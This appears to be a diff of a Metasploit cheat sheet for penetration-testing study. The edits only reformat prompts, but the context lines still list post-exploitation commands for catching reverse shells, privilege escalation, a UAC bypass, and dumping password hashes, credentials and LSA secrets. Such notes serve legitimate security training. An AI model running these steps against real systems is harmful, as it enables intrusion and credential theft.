@@ -18,8 +18,7 @@
   MMMMMMMMNe                 JMMMMMNMMM  
   MMMMMMMMMMNm,            eMMMMMNMMNMM  
   MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM  
-  MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM  
-          https://metasploit.com         
+  MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM        
 ```
 
 Start as sudo/root if you want to bind to low ports.
@@ -61,7 +60,7 @@ msf> jobs
 Used to catch reverse shells of all kinds.
 
 ```bash
-use multi/handler
+msf> use multi/handler
 ```
 
 Set it to the payload you used in your msfvenom command.
@@ -108,19 +107,19 @@ msf> set AutoRunScript post/windows/manage/migrate
 ## Meterpreter
 
 ```bash
-meterpreter > getuid
-meterpreter > sysinfo
-meterpreter > shell
+meterpreter> getuid
+meterpreter> sysinfo
+meterpreter> shell
 ```
 
 Migrate to another process
 ```bash
-meterpreter > run post/windows/manage/migrate
+meterpreter> run post/windows/manage/migrate
 ```
 
 Background meterpreter sessions
 ```bash
-meterpreter > background
+meterpreter> background
 ```
 
 list active sessions
@@ -135,12 +134,12 @@ msf> sessions -i 2
 
 Attempt to elevate to SYSTEM user:
 ```bash
-meterpreter > getsystem
+meterpreter> getsystem
 ```
 
 Local exploit suggester
 ```bash
-meterpreter > run post/multi/recon/local_exploit_suggester
+meterpreter> run post/multi/recon/local_exploit_suggester
 ```
 
 Bypass UAC
@@ -150,23 +149,23 @@ msf> use exploit/windows/local/bypassuac_injection_winsxs
 
 Enum applications
 ```bash
-meterpreter > run post/windows/gather/enum_applications
+meterpreter> run post/windows/gather/enum_applications
 ```
 
 Logged in users
 ```bash
-meterpreter > run post/windows/gather/enum_logged_on_users
+meterpreter> run post/windows/gather/enum_logged_on_users
 ```
 
 Dump hashes
 ```bash
-meterpreter > run post/windows/gather/hashdump
-meterpreter > run post/windows/gather/credentials/credential_collector
+meterpreter> run post/windows/gather/hashdump
+meterpreter> run post/windows/gather/credentials/credential_collector
 ```
 
 Dump lsa 
 ```bash
-meterpreter > run post/windows/gather/lsa_secrets
+meterpreter> run post/windows/gather/lsa_secrets
 ```
 
 ARP_scanner (beware, probably banned in PWK and CTFs)
@@ -176,7 +175,7 @@ run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
 
 Check if you are on a virtual machine (honeypot check, but do not rely on this)
 ```bash
-meterpreter > run post/windows/gather/checkvm
+meterpreter> run post/windows/gather/checkvm
 ```
 
 ## Pivoting
